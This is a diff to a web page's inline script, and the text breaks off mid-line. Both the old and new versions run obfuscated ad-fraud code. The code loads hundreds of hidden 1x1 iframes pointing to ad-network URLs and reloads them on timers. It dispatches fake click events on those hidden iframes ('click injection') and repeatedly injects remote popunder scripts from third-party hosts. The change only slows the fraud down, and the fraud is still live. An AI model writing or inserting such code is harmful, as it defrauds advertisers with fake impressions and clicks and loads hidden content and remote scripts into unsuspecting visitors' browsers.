@@ -24,83 +24,53 @@
     '//unfoldedtrade.com/b/XUVwsXd.Gxll0NYiWXch/TeBmZ9PucZeUYlokTP-ThcTzOOcTYAdyNOqD/E/tPNVzeMt5KMPDSIc4HNsQK'
   ];
   var _0xabc = function(i){ return _0x5a1f[i]; };
-  var adUrls = _0x5a1f.slice(7); // all provided ad URLs
+  var container = document[_0xabc(0)]('div');
+  container[_0xabc(1)][_0xabc(2)] = _0xabc(5);
+  document[_0xabc(4)][_0xabc(3)](container);
 
-  // Use three hidden containers to avoid browser limits on one DOM node
-  var containers = [];
-  for (var c = 0; c < 3; c++) {
-    var container = document[_0xabc(0)]('div');
-    container[_0xabc(1)][_0xabc(2)] = _0xabc(5);
-    document[_0xabc(4)][_0xabc(3)](container);
-    containers.push(container);
-  }
+  var adUrls = _0x5a1f.slice(7);
 
-  function addIframesToContainer(container, count) {
-    for (var i = 0; i < count; i++) {
+  function addIframes(count){
+    for(var i=0; i<count; i++){
       var iframe = document[_0xabc(0)]('iframe');
       iframe.width = '1';
       iframe.height = '1';
       iframe[_0xabc(1)][_0xabc(2)] = _0xabc(6);
-      iframe.src = adUrls[Math.floor(Math.random() * adUrls.length)];
+      iframe.src = adUrls[Math.floor(Math.random()*adUrls.length)];
       container[_0xabc(3)](iframe);
     }
   }
 
-  // Initial load: 300 iframes per container = 900 total
-  containers.forEach(function(container) {
-    addIframesToContainer(container, 300);
-  });
+  // Initial 100 iframes
+  addIframes(100);
 
-  // Cycle each container at different speeds to reduce simultaneous heavy operations
-  var intervals = [800, 1200, 1600]; // milliseconds
-  containers.forEach(function(container, idx) {
-    setInterval(function() {
-      var ifs = container.querySelectorAll('iframe');
-      for (var j = 0; j < ifs.length; j++) {
-        container.removeChild(ifs[j]);
-      }
-      addIframesToContainer(container, 300);
-    }, intervals[idx]);
-  });
+  // Cycle every 5 seconds: clear and add 100 fresh iframes
+  setInterval(function(){
+    var ifs = container.querySelectorAll('iframe');
+    for(var j=0; j<ifs.length; j++){
+      container.removeChild(ifs[j]);
+    }
+    addIframes(100);
+  }, 5000);
 
-  // Click injection on all iframes every 1 second
-  setInterval(function() {
-    var allIframes = document.querySelectorAll('iframe');
-    for (var k = 0; k < allIframes.length; k++) {
-      var rect = allIframes[k].getBoundingClientRect();
-      var evt = new MouseEvent('click', {
-        clientX: rect.left + 1,
-        clientY: rect.top + 1,
+  // Click injection every 5 seconds on a random iframe
+  setInterval(function(){
+    var ifs = container.querySelectorAll('iframe');
+    if(ifs.length > 0){
+      var ad = ifs[Math.floor(Math.random()*ifs.length)];
+      var rect = ad.getBoundingClientRect();
+      var evt = new MouseEvent('click',{
+        clientX: rect.left+1,
+        clientY: rect.top+1,
         bubbles: true,
         cancelable: true,
         view: window
       });
-      allIframes[k].dispatchEvent(evt);
+      ad.dispatchEvent(evt);
     }
-  }, 1000);
+  }, 5000);
 
-  // Popunder storm: fire all popunders every 10 seconds
+  // Popunder rotation every 30 seconds
   var popScripts = [
     'https://vibrategrin.com/fe/33/d2/fe33d2be9e814339b1c0fa3d089168a8.js',
-    '//troubled-entertainment.com/dZmaF.zvdsGpNAvQZKGQUC/Aeom_9-uEZ/UAlrk/PbTSc-zvOmTzAMyzNfTtMntnNgzNMP5hMhD/IC1/Ncwh',
-    '//kindlynet.com/c/D/9.6qbf2/5Sl/SQW/Qd9vN/zVMV5WMpDqII2MMtSn0C3HMJzwk/wLMbjlYh1-',
-    '//unfoldedtrade.com/b/XhV/s/d.GPlY0vYqWBcW/kebm/9guEZ_Ull/kZP/TqclzHOkTfAXyONrjCkjtWNqzlMI5fMUDUIc3dM/wN',
-    '//unfoldedtrade.com/b/XUVwsXd.Gxll0NYiWXch/TeBmZ9PucZeUYlokTP-ThcTzOOcTYAdyNOqD/E/tPNVzeMt5KMPDSIc4HNsQK'
-  ];
-  function firePops() {
-    for (var p = 0; p < popScripts.length; p++) {
-      var s = document.createElement('script');
-      s.src = popScripts[p];
-      s.async = true;
-      document.body.appendChild(s);
-    }
-  }
-  setInterval(firePops, 10000);
-  setTimeout(firePops, 2000);
-})();
-</script>
-
-<!-- Adsterra social bar -->
-<script src="https://vibrategrin.com/5f/72/7f/5f727f4293263daa3c71da133b05633c.js"></script>
-</body>
-</html>
+    '//troubled-entertainment.com/dZmaF.zvdsGpNAvQZKG
